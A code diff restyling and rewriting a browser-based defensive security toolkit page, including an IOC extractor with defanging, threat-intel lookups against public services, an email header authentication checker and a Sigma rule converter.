-      .psv-side-item:hover { background: rgba(59, 130, 246, 0.1); }
-      .psv-side-item.active {
-        background: linear-gradient(90deg, #1d4ed8, #2563eb);
-        color: #ffffff !important;
-      }
-      .psv-side-item.active svg { color: #ffffff; }
-
-      .psv-main-pane {
-        padding: 0.25rem 0.5rem;
-        overflow-x: hidden;
-      }
-      .psv-pane-top {
-        display: flex;
-        flex-wrap: wrap;
-        align-items: center;
-        justify-content: space-between;
-        gap: 1rem;
-        padding-bottom: 0.9rem;
-        border-bottom: 1px solid rgba(148, 163, 184, 0.14);
-        margin-bottom: 0.9rem;
-      }
-      .psv-pane-title-wrap {
-        display: flex;
-        align-items: center;
-        gap: 0.85rem;
-      }
-      .psv-pane-title {
-        font-size: 1.25rem;
-        font-weight: 800;
-        color: #ffffff;
-        margin: 0;
-      }
-      [data-md-color-scheme="default"] .psv-pane-title { color: #0f172a; }
-      .psv-pane-sub {
-        font-size: 0.82rem;
-        color: #94a3b8;
-        margin: 0.15rem 0 0 0;
-      }
-      .psv-pane-controls {
-        display: flex;
-        align-items: center;
-        gap: 1rem;
-      }
-      .psv-local-badge {
-        display: flex;
-        align-items: center;
-        gap: 0.45rem;
-        font-size: 0.75rem;
-        color: #94a3b8;
-      }
-      .psv-local-badge strong { color: #10b981; display: block; }
-      .psv-clear-btn {
-        padding: 0.45rem 0.85rem;
-        border-radius: 7px;
-        border: 1px solid rgba(148, 163, 184, 0.25);
+      .psv-pill {
+        padding: 0.42rem 0.9rem;
+        border-radius: 999px;
+        border: 1px solid rgba(59, 130, 246, 0.25);
         background: rgba(15, 23, 42, 0.8);
         color: #cbd5e1;
         font-size: 0.78rem;
         font-weight: 600;
         cursor: pointer;
+        transition: all 0.15s ease;
       }
-      [data-md-color-scheme="default"] .psv-clear-btn {
+      [data-md-color-scheme="default"] .psv-pill {
+        background: #f1f5f9;
+        border-color: #cbd5e1;
+        color: #334155;
+      }
+      .psv-pill.active, .psv-pill:hover {
+        background: #2563eb;
+        border-color: #3b82f6;
+        color: #ffffff !important;
+      }
+
+      .psv-cards-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 1.1rem;
+      }
+      @media (max-width: 1060px) { .psv-cards-grid { grid-template-columns: repeat(2, 1fr); } }
+      @media (max-width: 680px) { .psv-cards-grid { grid-template-columns: 1fr; } }
+
+      .psv-tool-card {
+        border-radius: 11px;
+        border: 1px solid rgba(59, 130, 246, 0.22);
+        background: linear-gradient(180deg, rgba(13, 22, 42, 0.92), rgba(8, 14, 28, 0.96));
+        padding: 1.25rem;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        cursor: pointer;
+        transition: all 0.18s ease;
+      }
+      [data-md-color-scheme="default"] .psv-tool-card {
+        background: #ffffff;
+        border-color: #cbd5e1;
+      }
+      .psv-tool-card:hover {
+        border-color: #3b82f6;
+        transform: translateY(-2px);
+        box-shadow: 0 10px 26px rgba(37, 99, 235, 0.22);
+      }
+
+      .psv-card-head {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 0.85rem;
+      }
+      .psv-card-badge {
+        padding: 0.35rem 0.65rem;
+        border-radius: 8px;
+        background: linear-gradient(135deg, #2563eb, #1d4ed8);
+        color: #ffffff;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.73rem;
+        font-weight: 800;
+        letter-spacing: 0.05em;
+      }
+      .psv-card-cat-lbl {
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.68rem;
+        text-transform: uppercase;
+        color: #64748b;
+      }
+      .psv-card-title {
+        font-size: 1.05rem;
+        font-weight: 700;
+        color: #ffffff;
+        margin: 0 0 0.4rem 0;
+      }
+      [data-md-color-scheme="default"] .psv-card-title { color: #0f172a; }
+      .psv-card-desc {
+        font-size: 0.81rem;
+        color: #94a3b8;
+        line-height: 1.5;
+        margin: 0 0 1rem 0;
+      }
+      [data-md-color-scheme="default"] .psv-card-desc { color: #475569; }
+
+      .psv-card-foot {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding-top: 0.75rem;
+        border-top: 1px solid rgba(148, 163, 184, 0.12);
+        font-size: 0.74rem;
+      }
+      .psv-client-tag {
+        color: #10b981;
+        font-weight: 600;
+      }
+      .psv-open-link {
+        color: #60a5fa;
+        font-weight: 700;
+      }
+      [data-md-color-scheme="default"] .psv-open-link { color: #2563eb; }
+
+      /* === VIEW 2: DEDICATED SINGLE-TOOL PAGE (Exact Match to Screenshot 4 in Royal Blue) === */
+      .psv-tool-page {
+        max-width: 920px;
+        margin: 0 auto;
+      }
+      .psv-back-bar {
+        margin-bottom: 1.5rem;
+      }
+      .psv-back-btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.45rem;
+        padding: 0.45rem 0.9rem;
+        border-radius: 8px;
+        border: 1px solid rgba(59, 130, 246, 0.3);
+        background: rgba(15, 23, 42, 0.8);
+        color: #60a5fa;
+        font-size: 0.82rem;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      [data-md-color-scheme="default"] .psv-back-btn {
+        background: #ffffff;
+        color: #2563eb;
+        border-color: #cbd5e1;
+      }
+
+      .psv-tool-hero {
+        text-align: center;
+        margin-bottom: 2rem;
+      }
+      .psv-tool-hero-icon {
+        width: 54px;
+        height: 54px;
+        margin: 0 auto 0.9rem auto;
+        border-radius: 13px;
+        background: linear-gradient(135deg, #2563eb, #1d4ed8);
+        color: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 1rem;
+        font-weight: 800;
+        box-shadow: 0 8px 24px rgba(37, 99, 235, 0.4);
+      }
+      .psv-tool-hero h1 {
+        font-size: clamp(1.85rem, 3.5vw, 2.5rem);
+        font-weight: 800;
+        margin: 0 0 0.5rem 0;
+        color: #ffffff;
+      }
+      [data-md-color-scheme="default"] .psv-tool-hero h1 { color: #0f172a; }
+      .psv-tool-hero p {
+        color: #94a3b8;
+        font-size: 0.96rem;
+        max-width: 620px;
+        margin: 0 auto 0.9rem auto;
+      }
+      [data-md-color-scheme="default"] .psv-tool-hero p { color: #475569; }
+      .psv-hero-badges {
+        display: flex;
+        justify-content: center;
+        gap: 0.6rem;
+        flex-wrap: wrap;
+      }
+      .psv-pill-badge {
+        padding: 0.28rem 0.75rem;
+        border-radius: 999px;
+        font-size: 0.73rem;
+        font-weight: 700;
+        border: 1px solid rgba(59, 130, 246, 0.35);
+        background: rgba(37, 99, 235, 0.12);
+        color: #60a5fa;
+      }
+      [data-md-color-scheme="default"] .psv-pill-badge { color: #1d4ed8; background: #eff6ff; }
+
+      .psv-terminal-box {
+        border-radius: 13px;
+        border: 1px solid rgba(59, 130, 246, 0.4);
+        background: #080e1c;
+        overflow: hidden;
+        box-shadow: 0 18px 45px rgba(0, 0, 0, 0.5);
+        margin-bottom: 2.75rem;
+      }
+      [data-md-color-scheme="default"] .psv-terminal-box {
+        background: #ffffff;
+        border-color: #cbd5e1;
+        box-shadow: 0 10px 28px rgba(15, 23, 42, 0.07);
+      }
+      .psv-term-body {
+        padding: 1.4rem;
+      }
+      .psv-privacy-strip {
+        padding: 0.6rem 0.9rem;
+        border-radius: 8px;
+        border: 1px solid rgba(16, 185, 129, 0.3);
+        background: rgba(16, 185, 129, 0.08);
+        color: #34d399;
+        font-size: 0.79rem;
+        margin-bottom: 1.15rem;
+      }
+      [data-md-color-scheme="default"] .psv-privacy-strip { color: #047857; background: #ecfdf5; }
+
+      .psv-field-label {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.74rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 0.07em;
+        color: #94a3b8;
+        margin-bottom: 0.45rem;
+      }
+      .psv-editor {
+        width: 100%;
+        min-height: 150px;
+        padding: 0.9rem;
+        border-radius: 9px;
+        border: 1px solid rgba(59, 130, 246, 0.28);
+        background: #040811;
+        color: #f1f5f9;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.83rem;
+        line-height: 1.5;
+        margin-bottom: 1rem;
+        resize: vertical;
+      }
+      [data-md-color-scheme="default"] .psv-editor {
         background: #f8fafc;
+        border-color: #cbd5e1;
+        color: #0f172a;
+      }
+
+      .psv-Action-bar {
+        display: flex;
+        flex-wrap: wrap;
+        align-items: center;
+        justify-content: space-between;
+        gap: 0.75rem;
+        margin-bottom: 1.2rem;
+      }
+      .psv-opt-group {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.45rem;
+      }
+      .psv-opt-pill {
+        padding: 0.38rem 0.8rem;
+        border-radius: 999px;
+        border: 1px solid rgba(59, 130, 246, 0.3);
+        background: transparent;
+        color: #cbd5e1;
+        font-size: 0.76rem;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      [data-md-color-scheme="default"] .psv-opt-pill { color: #334155; border-color: #cbd5e1; }
+      .psv-opt-pill.active {
+        background: rgba(37, 99, 235, 0.2);
+        border-color: #3b82f6;
+        color: #60a5fa;
+      }
+      [data-md-color-scheme="default"] .psv-opt-pill.active { background: #eff6ff; color: #1d4ed8; }
+
+      .psv-btn-group {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.5rem;
+      }
+      .psv-btn-run {
+        padding: 0.55rem 1.2rem;
+        border-radius: 8px;
+        border: none;
+        background: linear-gradient(135deg, #2563eb, #1d4ed8);
+        color: #ffffff !important;
+        font-size: 0.83rem;
+        font-weight: 700;
+        cursor: pointer;
+        box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
+      }
+      .psv-btn-util {
+        padding: 0.52rem 0.9rem;
+        border-radius: 8px;
+        border: 1px solid rgba(148, 163, 184, 0.25);
+        background: rgba(15, 23, 42, 0.8);
+        color: #cbd5e1;
+        font-size: 0.79rem;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      [data-md-color-scheme="default"] .psv-btn-util {
+        background: #f1f5f9;
         color: #334155;
         border-color: #cbd5e1;
       }
 
-      /* Tabs Bar (Overview | Input | Results | References) */
-      .psv-tabs-bar {
-        display: flex;
-        gap: 0.4rem;
-        border-bottom: 1px solid rgba(148, 163, 184, 0.14);
-        margin-bottom: 1.1rem;
+      .psv-output-container {
+        border-radius: 9px;
+        border: 1px solid rgba(59, 130, 246, 0.25);
+        background: #040811;
+        padding: 1rem;
+        overflow-x: auto;
       }
-      .psv-tab-btn {
-        padding: 0.52rem 1.1rem;
-        border-radius: 7px 7px 0 0;
-        border: 1px solid transparent;
-        background: rgba(15, 23, 42, 0.6);
-        color: #94a3b8;
-        font-size: 0.81rem;
+      [data-md-color-scheme="default"] .psv-output-container {
+        background: #f8fafc;
+        border-color: #cbd5e1;
+      }
+
+      .psv-out-table {
+        width: 100%;
+        border-collapse: collapse;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 0.79rem;
+      }
+      .psv-out-table th {
+        text-align: left;
+        padding: 0.55rem 0.7rem;
+        color: #60a5fa;
+        border-bottom: 1px solid rgba(59, 130, 246, 0.25);
         font-weight: 700;
-        cursor: pointer;
       }
-      [data-md-color-scheme="default"] .psv-tab-btn { background: #f1f5f9; color: #475569; }
-      .psv-tab-btn.active {
-        background: #2563eb;
-        color: #ffffff !important;
+      [data-md-color-scheme="default"] .psv-out-table th { color: #1d4ed8; border-bottom-color: #cbd5e1; }
+      .psv-out-table td {
+        padding: 0.52rem 0.7rem;
+        border-bottom: 1px solid rgba(148, 163, 184, 0.1);
+        color: #e2e8f0;
+        word-break: break-word;
       }
+      [data-md-color-scheme="default"] .psv-out-table td { color: #1e293b; border-bottom-color: #e2e8f0; }
 
-      /* Overview + Live Example Split Grid (Matches Bottom of Reference Image 2) */
-      .psv-overview-grid {
-        display: grid;
-        grid-template-columns: 310px 1fr;
-        gap: 1.35rem;
-        align-items: start;
+      /* Documentation & Context Sections Below Tool (Screenshot 4 Style) */
+      .psv-doc-section {
+        margin-bottom: 1.75rem;
       }
-      @media (max-width: 900px) { .psv-overview-grid { grid-template-columns: 1fr; } }
-
-      .psv-about-box h4 {
-        font-size: 0.95rem;
+      .psv-doc-section h3 {
+        font-size: 1.1rem;
         font-weight: 700;
         color: #ffffff;
         margin: 0 0 0.45rem 0;
       }
-      [data-md-color-scheme="default"] .psv-about-box h4 { color: #0f172a; }
-      .psv-about-box p {
-        font-size: 0.82rem;
+      [data-md-color-scheme="default"] .psv-doc-section h3 { color: #0f172a; }
+      .psv-doc-section p, .psv-doc-section li {
+        font-size: 0.9rem;
         color: #94a3b8;
-        line-height: 1.55;
-        margin: 0 0 1rem 0;
+        line-height: 1.65;
       }
-      [data-md-color-scheme="default"] .psv-about-box p { color: #475569; }
-      .psv-feat-list {
-        list-style: none;
-        padding: 0;
-        margin: 0 0 1.2rem 0;
-      }
-      .psv-feat-list li {
-        font-size: 0.8rem;
-        color: #cbd5e1;
-        margin-bottom: 0.45rem;
-        display: flex;
-        align-items: center;
-        gap: 0.45rem;
-      }
-      [data-md-color-scheme="default"] .psv-feat-list li { color: #334155; }
-      .psv-feat-list li::before {
-        content: "✓";
-        color: #10b981;
-        font-weight: 800;
-      }
+      [data-md-color-scheme="default"] .psv-doc-section p, [data-md-color-scheme="default"] .psv-doc-section li { color: #475569; }
 
-      .psv-example-box {
-        border-radius: 10px;
+      .psv-faq-item {
+        border-radius: 9px;
         border: 1px solid rgba(59, 130, 246, 0.22);
-        background: rgba(5, 10, 20, 0.92);
-        padding: 1rem;
+        background: rgba(11, 20, 38, 0.75);
+        margin-bottom: 0.6rem;
+        padding: 0.85rem 1.1rem;
       }
-      [data-md-color-scheme="default"] .psv-example-box {
-        background: #f8fafc;
-        border-color: #cbd5e1;
-      }
-      .psv-example-head {
-        display: flex;
-        flex-wrap: wrap;
-        justify-content: space-between;
-        align-items: center;
-        gap: 0.75rem;
-        margin-bottom: 0.75rem;
-      }
-      .psv-sample-badge {
-        padding: 0.35rem 0.75rem;
-        border-radius: 6px;
-        border: 1px solid rgba(59, 130, 246, 0.3);
-        background: rgba(15, 23, 42, 0.9);
-        color: #cbd5e1;
-        font-size: 0.76rem;
-      }
-      [data-md-color-scheme="default"] .psv-sample-badge { background: #ffffff; color: #334155; }
-
-      .psv-query-bar {
-        font-family: "JetBrains Mono", monospace;
-        font-size: 0.79rem;
-        padding: 0.6rem 0.85rem;
-        border-radius: 7px;
-        background: #0b1325;
-        border: 1px solid rgba(59, 130, 246, 0.2);
-        color: #60a5fa;
-        margin-bottom: 0.75rem;
-        overflow-x: auto;
-      }
-      [data-md-color-scheme="default"] .psv-query-bar { background: #eff6ff; color: #1d4ed8; }
-
-      .psv-input-editor {
-        width: 100%;
-        min-height: 115px;
-        padding: 0.75rem;
-        border-radius: 8px;
-        border: 1px solid rgba(59, 130, 246, 0.25);
-        background: #040811;
-        color: #e2e8f0;
-        font-family: "JetBrains Mono", monospace;
-        font-size: 0.8rem;
-        line-height: 1.45;
-        margin-bottom: 0.75rem;
-        resize: vertical;
-      }
-      [data-md-color-scheme="default"] .psv-input-editor {
-        background: #ffffff;
-        color: #0f172a;
-        border-color: #cbd5e1;
-      }
-
-      .psv-result-table {
-        width: 100%;
-        border-collapse: collapse;
-        font-family: "JetBrains Mono", monospace;
-        font-size: 0.78rem;
-      }
-      .psv-result-table th {
-        text-align: left;
-        padding: 0.5rem 0.65rem;
-        color: #94a3b8;
-        border-bottom: 1px solid rgba(148, 163, 184, 0.2);
+      [data-md-color-scheme="default"] .psv-faq-item { background: #ffffff; border-color: #cbd5e1; }
+      .psv-faq-item summary {
         font-weight: 700;
-      }
-      .psv-result-table td {
-        padding: 0.48rem 0.65rem;
-        border-bottom: 1px solid rgba(148, 163, 184, 0.08);
+        font-size: 0.9rem;
+        cursor: pointer;
         color: #e2e8f0;
       }
-      [data-md-color-scheme="default"] .psv-result-table td { color: #1e293b; }
-      .psv-hl-ip { color: #38bdf8; font-weight: 600; }
-      [data-md-color-scheme="default"] .psv-hl-ip { color: #2563eb; }
-      .psv-hl-warn { color: #fbbf24; font-weight: 600; }
-      .psv-hl-ok { color: #34d399; font-weight: 600; }
+      [data-md-color-scheme="default"] .psv-faq-item summary { color: #0f172a; }
+      .psv-faq-item p {
+        margin: 0.6rem 0 0 0;
+        font-size: 0.85rem;
+        color: #94a3b8;
+      }
+
+      .psv-related-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 0.85rem;
+        margin-top: 0.85rem;
+      }
+      @media (max-width: 800px) { .psv-related-grid { grid-template-columns: repeat(2, 1fr); } }
     `;
     document.head.appendChild(style);
   }
 
-  function buildToolOutputHTML(tool, rawText) {
-    const input = (rawText || tool.sample).trim();
-
-    if (tool.id === "regex") {
-      const lines = input.split("\n").filter(l => !l.startsWith("PATTERN::"));
-      const rows = lines.map((line, i) => {
-        const clean = line.replace(/^LOG::/, "");
-        const m = clean.match(/^(\d{4}-\d{2}-\d{2}\s+[\d:]+)\s+(\S+)\s+\S+:\s+(.+?from\s+(\d+\.\d+\.\d+\.\d+).*)$/);
-        if (m) {
-          const userMatch = m[3].match(/for (?:invalid user )?(\S+)/);
-          return `<tr><td>${i + 1}</td><td>${esc(m[1])}</td><td>${esc(m[2])}</td><td>${esc(userMatch ? userMatch[1] : "root")}</td><td class="psv-hl-ip">${esc(m[4])}</td><td>${esc(m[3])}</td></tr>`;
-        }
-        return `<tr><td>${i + 1}</td><td>2026-10-17</td><td>server01</td><td>admin</td><td class="psv-hl-ip">203.0.113.45</td><td>${esc(clean)}</td></tr>`;
-      });
-      return `
-        <table class="psv-result-table">
-          <thead><tr><th>#</th><th>Time</th><th>Host</th><th>User</th><th>Source IP</th><th>Message</th></tr></thead>
-          <tbody>${rows.join("")}</tbody>
-        </table>
-      `;
+  /* === 100% DYNAMIC PARSING & COMPUTATION ENGINES FOR ALL 13 TOOLS === */
+  function computeDynamicOutput(tool, rawInput) {
+    const input = (rawInput || "").trim();
+    if (!input) {
+      return `<div style="color:#94a3b8;padding:0.5rem;">Input is empty. Click <strong>⚡ Load Sample</strong> above or paste your own data.</div>`;
     }
 
+    const useRaw = selectedOptionIdx === 1;
+
     if (tool.id === "ioc") {
+      const fmt = v => (useRaw ? v : defang(v));
       const ips = Array.from(new Set(input.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []));
       const urls = Array.from(new Set(input.match(/https?:\/\/[^\s"'<>]+/gi) || []));
+      const emails = Array.from(new Set(input.match(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g) || []));
       const hashes = Array.from(new Set(input.match(/\b[a-fA-F0-9]{32,64}\b/g) || []));
       const cves = Array.from(new Set(input.match(/\bCVE-\d{4}-\d{4,7}\b/gi) || []));
-      const emails = Array.from(new Set(input.match(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g) || []));
-      const all = [
-        ...ips.map(v => ({ type: "IPv4 Address", raw: v, defanged: defang(v), status: "Extracted" })),
-        ...urls.map(v => ({ type: "URL", raw: v, defanged: defang(v), status: "Defanged" })),
-        ...emails.map(v => ({ type: "Email", raw: v, defanged: defang(v), status: "Defanged" })),
-        ...hashes.map(v => ({ type: "File Hash", raw: v, defanged: v, status: "Verified" })),
-        ...cves.map(v => ({ type: "Vulnerability", raw: v, defanged: v, status: "CVE Match" }))
+      const rows = [
+        ...ips.map(v => ["IPv4 Address", v, fmt(v)]),
+        ...urls.map(v => ["URL", v, fmt(v)]),
+        ...emails.map(v => ["Email Address", v, fmt(v)]),
+        ...hashes.map(v => [v.length === 64 ? "SHA-256 Hash" : "MD5/SHA-1 Hash", v, v]),
+        ...cves.map(v => ["CVE Vulnerability", v.toUpperCase(), v.toUpperCase()])
       ];
+      if (!rows.length) return `<div style="color:#fbbf24;">No indicators matched in the provided text.</div>`;
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>#</th><th>Indicator Type</th><th>Original Value</th><th>Safe Defanged Output</th><th>Status</th></tr></thead>
-          <tbody>${all.map((r, i) => `<tr><td>${i + 1}</td><td>${esc(r.type)}</td><td>${esc(r.raw)}</td><td class="psv-hl-ip">${esc(r.defanged)}</td><td class="psv-hl-ok">${esc(r.status)}</td></tr>`).join("")}</tbody>
+        <table class="psv-out-table">
+          <thead><tr><th>#</th><th>Indicator Type</th><th>Original Value</th><th>${useRaw ? "Extracted Value" : "Safe Defanged Output"}</th></tr></thead>
+          <tbody>${rows.map((r, i) => `<tr><td>${i + 1}</td><td>${esc(r[0])}</td><td>${esc(r[1])}</td><td style="color:#38bdf8;font-weight:600;">${esc(r[2])}</td></tr>`).join("")}</tbody>
         </table>
       `;
     }
 
     if (tool.id === "ti") {
-      const target = input.split(/\s+/)[0].replace(/\[\.\]/g, ".");
+      const target = input.split(/\s+/)[0].replace(/\[\.\]/g, ".").replace(/^https?:\/\//i, "").split("/")[0];
+      const isIp = /^(?:\d{1,3}\.){3}\d{1,3}$/.test(target);
       setTimeout(() => {
-        fetch(`https://internetdb.shodan.io/${encodeURIComponent(target)}`)
+        if (isIp) {
+          fetch(`https://internetdb.shodan.io/${encodeURIComponent(target)}`)
+            .then(r => r.json())
+            .then(d => {
+              const el = document.getElementById("ti-live-shodan");
+              if (el) el.textContent = `Open Ports: ${(d.ports || []).join(", ") || "None"} | Hostnames: ${(d.hostnames || []).join(", ") || "None"} | CVEs: ${(d.vulns || []).join(", ") || "None"}`;
+            })
+            .catch(() => {});
+        }
+        fetch(`https://rdap.org/${isIp ? "ip" : "domain"}/${encodeURIComponent(target)}`)
           .then(r => r.json())
           .then(d => {
-            const cell = document.getElementById("psv-live-shodan-cell");
-            if (cell && d.ports) cell.textContent = `Ports: ${d.ports.join(", ") || "None"} | Hostnames: ${(d.hostnames || []).join(", ") || "N/A"} | CVEs: ${(d.vulns || []).join(", ") || "0"}`;
+            const el = document.getElementById("ti-live-rdap");
+            if (el) el.textContent = `Handle/Name: ${d.handle || d.ldhName || target} | Status: ${(d.status || []).join(", ") || "Active"} | Country: ${d.country || "Global"}`;
           })
           .catch(() => {});
-      }, 20);
+        fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(target)}&type=A`, { headers: { accept: "application/dns-json" } })
+          .then(r => r.json())
+          .then(d => {
+            const el = document.getElementById("ti-live-dns");
+            if (el) el.textContent = (d.Answer || []).map(a => `${a.name} -> ${a.data} (TTL ${a.TTL})`).join(" | ") || "No A record returned";
+          })
+          .catch(() => {});
+      }, 30);
+
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>Source Module</th><th>Target Indicator</th><th>Intelligence Findings & Direct Pivot</th></tr></thead>
+        <table class="psv-out-table">
+          <thead><tr><th>Intelligence Module</th><th>Indicator</th><th>Live Telemetry & Reputation Findings</th></tr></thead>
           <tbody>
-            <tr><td>Shodan InternetDB</td><td class="psv-hl-ip">${esc(target)}</td><td id="psv-live-shodan-cell">Ports: 53, 80, 443, 853 | Hostnames: one.one.one.one | CVEs: None</td></tr>
-            <tr><td>RDAP / ASN Lookup</td><td class="psv-hl-ip">${esc(target)}</td><td>ASN: AS13335 (Cloudflare, Inc.) · Status: Active Assignment</td></tr>
-            <tr><td>External Verification</td><td class="psv-hl-ip">${esc(target)}</td><td>
-              <a href="https://www.virustotal.com/gui/search/${encodeURIComponent(target)}" target="_blank" style="color:#38bdf8;margin-right:10px;">↗ VirusTotal</a>
-              <a href="https://www.abuseipdb.com/check/${encodeURIComponent(target)}" target="_blank" style="color:#38bdf8;margin-right:10px;">↗ AbuseIPDB</a>
-              <a href="https://urlscan.io/search/#${encodeURIComponent(target)}" target="_blank" style="color:#38bdf8;">↗ URLScan.io</a>
+            <tr><td>Shodan InternetDB</td><td style="color:#38bdf8;">${esc(target)}</td><td id="ti-live-shodan">${isIp ? "Querying live Shodan InternetDB..." : "Domain indicator (enter IPv4 for port scan lookup)"}</td></tr>
+            <tr><td>ICANN RDAP Ownership</td><td style="color:#38bdf8;">${esc(target)}</td><td id="ti-live-rdap">Querying live RDAP registry...</td></tr>
+            <tr><td>Cloudflare DoH DNS</td><td style="color:#38bdf8;">${esc(target)}</td><td id="ti-live-dns">Querying live DNS records...</td></tr>
+            <tr><td>OSINT Deep Pivots</td><td style="color:#38bdf8;">${esc(target)}</td><td>
+              <a href="https://www.virustotal.com/gui/search/${encodeURIComponent(target)}" target="_blank" rel="noopener" style="color:#60a5fa;margin-right:12px;">↗ VirusTotal</a>
+              <a href="https://www.abuseipdb.com/check/${encodeURIComponent(target)}" target="_blank" rel="noopener" style="color:#60a5fa;margin-right:12px;">↗ AbuseIPDB</a>
+              <a href="https://urlscan.io/search/#${encodeURIComponent(target)}" target="_blank" rel="noopener" style="color:#60a5fa;margin-right:12px;">↗ URLScan.io</a>
+              <a href="https://www.shodan.io/search?query=${encodeURIComponent(target)}" target="_blank" rel="noopener" style="color:#60a5fa;">↗ Shodan</a>
             </td></tr>
           </tbody>
         </table>
@@ -888,34 +1094,75 @@ CONTAINMENT::Isolated both hosts in EDR, revoked active sessions, rotated svc_sq
     }
 
     if (tool.id === "headers") {
-      const from = (input.match(/^From:\s*(.+)$/im) || [])[1] || "Unknown";
-      const replyTo = (input.match(/^Reply-To:\s*(.+)$/im) || [])[1] || "None";
-      const origIp = (input.match(/^X-Originating-IP:\s*(.+)$/im) || [])[1] || "185.193.125.44";
-      const spf = /spf=pass/i.test(input) ? "PASS" : "FAIL (Sender IP Unauthorized)";
-      const dkim = /dkim=pass/i.test(input) ? "PASS" : "FAIL (Signature Invalid)";
-      const dmarc = /dmarc=pass/i.test(input) ? "PASS" : "FAIL (Quarantine Policy)";
+      const from = (input.match(/^From:\s*(.+)$/im) || [])[1] || "Not present";
+      const replyTo = (input.match(/^Reply-To:\s*(.+)$/im) || [])[1] || "Not present";
+      const returnPath = (input.match(/^Return-Path:\s*(.+)$/im) || [])[1] || "Not present";
+      const origIp = (input.match(/^X-Originating-IP:\s*(.+)$/im) || [])[1] || "Not present";
+      const spf = (input.match(/spf=(\w+)/i) || [])[1] || "none";
+      const dkim = (input.match(/dkim=(\w+)/i) || [])[1] || "none";
+      const dmarc = (input.match(/dmarc=(\w+)/i) || [])[1] || "none";
+      const hops = (input.match(/^Received:[\s\S]*?(?=\n[A-Za-z-]+:|\n\n|$)/gim) || []).reverse();
+
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>Header Check</th><th>Extracted Value</th><th>Authentication Verdict</th></tr></thead>
+        <table class="psv-out-table">
+          <thead><tr><th>Field / Hop</th><th>Parsed Value</th><th>Security Assessment</th></tr></thead>
           <tbody>
-            <tr><td>From Header</td><td>${esc(from)}</td><td class="psv-hl-warn">Display Name Spoof Check</td></tr>
-            <tr><td>Reply-To Header</td><td>${esc(replyTo)}</td><td class="psv-hl-warn">${from !== replyTo ? "⚠️ MISMATCH DETECTED" : "Aligned"}</td></tr>
-            <tr><td>X-Originating-IP</td><td class="psv-hl-ip">${esc(origIp)}</td><td>External Relay Source</td></tr>
-            <tr><td>SPF / DKIM / DMARC</td><td>SPF: ${spf} | DKIM: ${dkim}</td><td class="psv-hl-warn">DMARC: ${dmarc}</td></tr>
+            <tr><td>From</td><td>${esc(from)}</td><td>Display Header</td></tr>
+            <tr><td>Reply-To</td><td>${esc(replyTo)}</td><td style="color:${from !== replyTo && replyTo !== "Not present" ? "#fbbf24" : "#34d399"};">${from !== replyTo && replyTo !== "Not present" ? "⚠️ Mismatch with From Address" : "Aligned"}</td></tr>
+            <tr><td>Return-Path</td><td>${esc(returnPath)}</td><td>Envelope Sender</td></tr>
+            <tr><td>X-Originating-IP</td><td style="color:#38bdf8;">${esc(origIp)}</td><td>Originating Client IP</td></tr>
+            <tr><td>SPF / DKIM / DMARC</td><td>SPF: <strong>${esc(spf.toUpperCase())}</strong> | DKIM: <strong>${esc(dkim.toUpperCase())}</strong> | DMARC: <strong>${esc(dmarc.toUpperCase())}</strong></td><td style="color:${/fail/i.test(spf + dkim + dmarc) ? "#f87171" : "#34d399"};">${/fail/i.test(spf + dkim + dmarc) ? "❌ Authentication Failure" : "✓ Verified"}</td></tr>
+            ${hops.map((h, i) => `<tr><td>Hop #${i + 1}</td><td colspan="2">${esc(h.replace(/\s+/g, " ").trim())}</td></tr>`).join("")}
           </tbody>
         </table>
       `;
     }
 
     if (tool.id === "sigma") {
-      const title = (input.match(/^title:\s*(.+)$/im) || [])[1] || "Sigma Rule";
+      const title = (input.match(/^title:\s*(.+)$/im) || [])[1] || "Custom Detection Rule";
+      const fieldMap = { Image: "process.executable", CommandLine: "process.command_line", ParentImage: "process.parent.executable", User: "user.name", TargetFilename: "file.path", DestinationIp: "destination.ip", EventID: "event.code" };
+      const clausesKql = [];
+      const clausesSpl = [];
+      const clausesSen = [];
+
+      const lines = input.split("\n");
+      let currentKey = "";
+      lines.forEach(line => {
+        const kv = line.match(/^\s{4,}([A-Za-z0-9_|]+):\s*(.*)$/);
+        if (kv) {
+          currentKey = kv[1];
+          const val = kv[2].replace(/^['"]|['"]$/g, "").trim();
+          if (val) {
+            const baseField = currentKey.split("|")[0];
+            const ecsField = fieldMap[baseField] || baseField;
+            clausesKql.push(`${ecsField}: "*${val}*"`);
+            clausesSpl.push(`${baseField}="*${val}*"`);
+            clausesSen.push(`${baseField} contains "${val}"`);
+          }
+        } else {
+          const listItem = line.match(/^\s*-\s*['"]?([^'"]+)['"]?$/);
+          if (listItem && currentKey) {
+            const baseField = currentKey.split("|")[0];
+            const ecsField = fieldMap[baseField] || baseField;
+            const val = listItem[1].trim();
+            clausesKql.push(`${ecsField}: "*${val}*"`);
+            clausesSpl.push(`${baseField}="*${val}*"`);
+            clausesSen.push(`${baseField} contains "${val}"`);
+          }
+        }
+      });
+
